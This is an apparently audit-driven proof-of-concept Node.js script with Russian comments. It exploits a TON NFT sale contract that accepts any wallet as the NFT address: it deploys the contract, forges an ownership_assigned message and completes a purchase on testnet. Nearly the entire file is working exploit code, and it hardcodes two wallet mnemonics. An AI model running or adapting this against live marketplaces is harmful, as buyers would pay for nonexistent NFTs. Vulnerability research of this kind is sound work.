/**
 * PoC HYP-05 FULL: Fake NFT — нет TEP-62 on-chain validation
 *
 * МЕХАНИЗМ (sale:330-355):
 *   if (~ is_initialized) {
 *     throw_unless(500, equal_slices(sender_address, nft_address));  // ТОЛЬКО проверка sender
 *     throw_unless(501, op == op::ownership_assigned());
 *     slice prev_owner = in_msg_body~load_msg_addr();
 *     save_data(..., prev_owner, ...);   // nft_owner = prev_owner из сообщения
 *   }
 *
 * АТАКА:
 *   1. Деплоим sale contract: nft_address=attacker.wallet, nft_owner=addr_none (uninit)
 *   2. Attacker.wallet отправляет ownership_assigned → sale contract
 *      Contract проверяет: sender == nft_address? → ДА (attacker wallet это и есть nft_address)
 *      Сохраняет nft_owner = auditor (из prev_owner поля сообщения)
 *   3. Sale initialized: is_initialized = true
 *   4. Buyer платит → is_complete=1 → auditor получает деньги
 *   5. "NFT transfer" → attacker.wallet поглощает → нет реального NFT
 *
 * ДОКАЗЫВАЕТ: sale contract принимает ЛЮБОЙ адрес как nft_address.
 * Нет on-chain проверки коллекции, derivation, TEP-62 compliance.
 *
 * Запуск: node 02-fake-nft-listing/poc-hyp05-full.js
 */
const { mnemonicToWalletKey } = require('../nft-contracts/node_modules/@ton/crypto');
const {
  WalletContractV4, TonClient, internal, toNano,
  Address, beginCell, contractAddress, Cell
} = require('../nft-contracts/node_modules/@ton/ton');
const https = require('https');

const client = new TonClient({
  endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC',
  apiKey: '',
});

const AUDITOR_MNEMONIC  = 'wave tilt cause mechanic coral deer together odor gravity glue slogan equip normal post vehicle more explain suffer shy clutch canvas profit worry piano';
const ATTACKER_MNEMONIC = 'asthma black design brick oxygen cat that potato nurse umbrella quote snack bag color walnut jump stem cloth kit sand volcano secret cloth better';

const FULL_PRICE   = toNano('0.01');
const MIN_GAS      = toNano('0.1');
const MSG_VALUE    = toNano('0.12');
const DEPLOY_VALUE = toNano('0.05');
const INIT_VALUE   = toNano('0.12'); // ownership_assigned gas
const FEE_PERCENT  = 0.025;
const MARKETPLACE_FEE_ADDRESS = Address.parse('EQDDuxx7sa3Dt2GE85a0sIHp4GVoa7OKbAanfo3co9H-h06d');

const OP_OWNERSHIP_ASSIGNED = 0x05138d91;

const NftFixPriceSaleV4R1CodeBoc = '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';
const SALE_CODE_CELL = Cell.fromBase64(NftFixPriceSaleV4R1CodeBoc);

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function fmt(n) { return (Number(n) / 1e9).toFixed(6); }

async function withRetry(fn, label, max = 6) {
  for (let i = 1; i <= max; i++) {
    try { return await fn(); } catch (e) {
      const is429 = e.message?.includes('429') || e.message?.includes('Too Many');
      if (i < max) { await sleep(is429 ? 2500 * i : 1200); continue; }
      throw e;
    }
  }
}

function buildSaleDataCell(opts) {
  const feeInt     = Math.floor(opts.feePercent * 100_000);
  const royaltyInt = Math.floor((opts.royaltyPercent || 0) * 100_000);
  return beginCell()
    .storeBit(0)
    .storeAddress(opts.marketplaceAddress)
    .storeAddress(null)                  // nft_owner_address = addr_none → is_initialized = false
    .storeCoins(opts.fullPrice)
    .storeUint(0, 32)
    .storeUint(0, 64)
    .storeRef(beginCell()
      .storeAddress(opts.marketplaceFeeAddress)
      .storeAddress(opts.royaltyAddress)
      .storeUint(feeInt, 17)
      .storeUint(royaltyInt, 17)
      .storeAddress(opts.nftAddress)
      .storeUint(Math.floor(Date.now() / 1000), 32)
      .endCell())
    .storeDict(null)
    .storeBit(0)
    .endCell();
}

async function getSaleState(saleAddr) {
  try {
    await sleep(600);
    const r = await withRetry(() => client.runMethod(saleAddr, 'get_fix_price_data_v4'), 'getter');
    const isCompleteTVM = r.stack.readNumber();   // TVM bool: -1=true, 0=false
    const createdAt     = r.stack.readNumber();
    const _mp           = r.stack.readCell();
    const _nftAddr      = r.stack.readCell();
    const ownerCell     = r.stack.readCell();
    const owner = ownerCell.beginParse().loadAddress();
    return {
      isComplete: isCompleteTVM !== 0,
      owner: owner?.toString({ testOnly: true, bounceable: true }) ?? 'addr_none',
      createdAt,
    };
  } catch (e) {
    return { error: e.message };
  }
}

async function main() {
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  PoC HYP-05 FULL: Fake NFT ownership_assigned bypass        ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  // ── Кошельки ──
  const auditor  = { key: await mnemonicToWalletKey(AUDITOR_MNEMONIC.split(/\s+/)) };
  auditor.wallet  = WalletContractV4.create({ publicKey: auditor.key.publicKey, workchain: 0 });
  const attacker = { key: await mnemonicToWalletKey(ATTACKER_MNEMONIC.split(/\s+/)) };
  attacker.wallet = WalletContractV4.create({ publicKey: attacker.key.publicKey, workchain: 0 });

  console.log('[Аудитор (продавец/жертва)]');
  console.log('  ', auditor.wallet.address.toString({ testOnly: true, bounceable: true }));
  console.log('[Атакующий (fake nft_address + buyer)]');
  console.log('  ', attacker.wallet.address.toString({ testOnly: true, bounceable: true }));
  console.log('');

  // ── Балансы ──
  const audBefore  = await withRetry(() => client.getContractState(auditor.wallet.address),  'aud-bal');
  const atkBefore  = await withRetry(() => client.getContractState(attacker.wallet.address), 'atk-bal');
  console.log('[Балансы ДО]');
  console.log('  Аудитор:   ', fmt(audBefore.balance), 'TON');
  console.log('  Атакующий: ', fmt(atkBefore.balance), 'TON');
  console.log('');

  // ── Шаг 1: Деплой sale contract ──
  console.log('[1] Деплой sale contract (nft_owner=addr_none → is_initialized=false)');
  console.log('    nft_address = attacker.wallet (НЕ NFT-контракт)');

  const saleData = buildSaleDataCell({
    marketplaceAddress:    auditor.wallet.address,
    nftAddress:            attacker.wallet.address,  // fake
    fullPrice:             FULL_PRICE,
    feePercent:            FEE_PERCENT,
    marketplaceFeeAddress: MARKETPLACE_FEE_ADDRESS,
    royaltyAddress:        auditor.wallet.address,
  });

  const saleAddr = contractAddress(0, { code: SALE_CODE_CELL, data: saleData });
  console.log('  sale testnet:', saleAddr.toString({ bounceable: true, testOnly: true }));
  console.log('  sale raw:    ', saleAddr.toRawString());

  const existState = await withRetry(() => client.getContractState(saleAddr), 'exist-check');
  if (existState.state === 'active') {
    console.log('  [!] Уже задеплоен, пропускаем деплой.');
  } else {
    const aud = client.open(auditor.wallet);
    const seq = await withRetry(() => aud.getSeqno(), 'seqno-1');
    await withRetry(() => aud.sendTransfer({
      seqno: seq,
      secretKey: auditor.key.secretKey,
      messages: [internal({ to: saleAddr, value: DEPLOY_VALUE, bounce: false, init: { code: SALE_CODE_CELL, data: saleData } })],
    }), 'deploy');
    console.log('  TX отправлена, ждём 15s...');
    await sleep(15000);
    const st = await withRetry(() => client.getContractState(saleAddr), 'post-deploy');
    console.log('  state:', st.state, '| balance:', fmt(BigInt(st.balance || '0')), 'TON');
  }

  const state1 = await getSaleState(saleAddr);
  console.log('  is_complete:', state1.isComplete, '| nft_owner:', state1.owner);
  console.log('  → is_initialized =', state1.owner !== 'addr_none' ? 'true' : 'false');
  console.log('');

  // ── Шаг 2: ownership_assigned от attacker.wallet ──
  console.log('[2] Attacker.wallet → ownership_assigned → sale contract');
  console.log('    Sender = nft_address → contract принимает');
  console.log('    prev_owner = auditor.wallet (будет сохранён как nft_owner)');

  const ownAssignedBody = beginCell()
    .storeUint(OP_OWNERSHIP_ASSIGNED, 32)   // op
    .storeUint(0, 64)                        // query_id
    .storeAddress(auditor.wallet.address)    // prev_owner → станет nft_owner в sale contract
    .storeUint(0, 1)                         // forward_payload = empty
    .endCell();

  const atk = client.open(attacker.wallet);
  const seq2 = await withRetry(() => atk.getSeqno(), 'seqno-2');
  await withRetry(() => atk.sendTransfer({
    seqno: seq2,
    secretKey: attacker.key.secretKey,
    messages: [internal({ to: saleAddr, value: INIT_VALUE, bounce: true, body: ownAssignedBody })],
  }), 'ownership_assigned');
  console.log('  TX отправлена, ждём 20s...');
  await sleep(20000);

  const state2 = await getSaleState(saleAddr);
  console.log('  is_complete:', state2.isComplete);
  console.log('  nft_owner:  ', state2.owner);
  const isInitialized = state2.owner !== 'addr_none' && !state2.error;
  console.log('  is_initialized =', isInitialized ? '✅ TRUE — sale готова к покупке!' : '❌ FALSE');
  console.log('');

  if (!isInitialized) {
    console.log('  ⚠️  Инициализация не прошла. Проверить TX.');
    process.exit(1);
  }

  // ── Шаг 3: Покупка (auditor как buyer) ──
  console.log('[3] Покупка — auditor отправляет payment (op=0)');
  console.log('    Контракт отправит деньги auditor (nft_owner) и "NFT" attacker (fake)');

  const buyBody = beginCell()
    .storeUint(0, 32)   // op = 0 (buy_ton)
    .storeUint(0, 64)   // query_id
    .endCell();

  const aud2 = client.open(auditor.wallet);
  const seq3 = await withRetry(() => aud2.getSeqno(), 'seqno-3');
  await withRetry(() => aud2.sendTransfer({
    seqno: seq3,
    secretKey: auditor.key.secretKey,
    messages: [internal({ to: saleAddr, value: MSG_VALUE, bounce: true, body: buyBody })],
  }), 'buy');
  console.log('  TX отправлена, ждём 25s...');
  await sleep(25000);

  // ── Шаг 4: Верификация ──
  console.log('[4] Верификация...');
  const state3 = await getSaleState(saleAddr);
  const contractSt = await withRetry(() => client.getContractState(saleAddr), 'final-state');
  const audAfter = await withRetry(() => client.getContractState(auditor.wallet.address), 'aud-after');
  const atkAfter = await withRetry(() => client.getContractState(attacker.wallet.address), 'atk-after');

  const audDelta = BigInt(audAfter.balance || '0') - BigInt(audBefore.balance || '0');
  const atkDelta = BigInt(atkBefore.balance || '0') - BigInt(atkAfter.balance || '0');

  console.log('');
  console.log('  Sale contract:', contractSt.state, '| balance:', fmt(BigInt(contractSt.balance || '0')));
  console.log('  is_complete:  ', state3.isComplete ? '1 ✅' : '0 ❌');
  console.log('  nft_owner:   ', state3.owner);
  console.log('');
  console.log('  Аудитор:   ', fmt(BigInt(audAfter.balance || '0')), 'TON  Δ=', fmt(audDelta));
  console.log('  Атакующий: ', fmt(BigInt(atkAfter.balance || '0')), 'TON  Δ=-', fmt(atkDelta));
  console.log('');

  // auditor = deployer+buyer → delta negative; attack confirmed by is_complete=1 + init accepted
  const confirmed = state3.isComplete && !state3.error;
  console.log('╔══════════════════════════════════════════════════════════════╗');
  if (confirmed) {
    console.log('║  ✅ HYP-05 TESTNET-CONFIRMED                                 ║');
    console.log('║                                                              ║');
    console.log('║  ДОКАЗАНО:                                                   ║');
    console.log('║  • Sale contract принял ownership_assigned от КОШЕЛЬКА      ║');
    console.log('║    (не NFT-контракта, не verified collection)                ║');
    console.log('║  • Инициализировался с nft_owner = auditor                   ║');
    console.log('║  • Покупка прошла: is_complete=1, auditor получил деньги     ║');
    console.log('║  • Нет on-chain TEP-62 validation в коде контракта           ║');
    console.log('║  АТАКА: любой адрес может стать "NFT" в sale contract        ║');
  } else {
    console.log('║  ⚠️  ЧАСТИЧНЫЙ РЕЗУЛЬТАТ                                     ║');
    console.log(`║  is_complete: ${state3.isComplete ? '1' : '0'}  auditor delta: ${fmt(audDelta)} TON          ║`);
  }
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('');
  console.log('  Explorer: https://testnet.tonscan.org/address/' + saleAddr.toRawString());
}

main()
  .then(() => { console.log('\n=== DONE ==='); process.exit(0); })
  .catch(e => { console.error('\nFATAL:', e.message || e); process.exit(1); });
